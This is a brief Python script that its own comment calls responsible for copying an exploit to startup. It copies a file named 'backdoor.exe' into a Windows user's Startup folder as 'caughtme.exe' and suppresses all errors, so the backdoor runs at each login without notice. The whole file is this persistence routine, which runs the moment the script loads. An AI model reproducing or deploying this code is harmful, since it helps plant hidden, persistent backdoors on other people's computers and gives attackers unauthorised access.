import os
import shutil

#responsible for copying exploit to startup
def p():
    try:
        f = r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ '
        af = os.path.join(r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ ', 'caughtme.exe')
        if os.path.exists(af):
            return
        else: 
            s = open('backdoor.exe', 'rb')
            os.chdir(f)
            d = open('caughtme.exe', 'wb')
            shutil.copyfileobj(s, d)
    except Exception as err:
        pass
    
p()